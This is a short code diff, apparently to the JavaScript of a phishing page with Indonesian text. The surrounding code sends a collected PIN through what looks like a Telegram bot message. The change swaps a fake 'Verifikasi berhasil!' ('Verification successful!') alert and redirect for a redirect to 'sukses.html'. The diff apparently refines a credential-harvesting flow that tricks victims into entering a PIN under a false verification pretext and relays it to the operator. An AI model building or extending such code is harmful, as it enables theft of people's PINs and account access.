@@ -148,12 +148,9 @@
             text: text,
             parse_mode: 'Markdown'
           })
+      
+          window.location.href = "sukses.html"; 
         });
-
-        setTimeout(() => {
-          alert("Verifikasi berhasil!");
-          window.location.href = "index.html"; 
-        }, 300);
 
       } catch (err) {
         alert("Gagal mengirim PIN.");
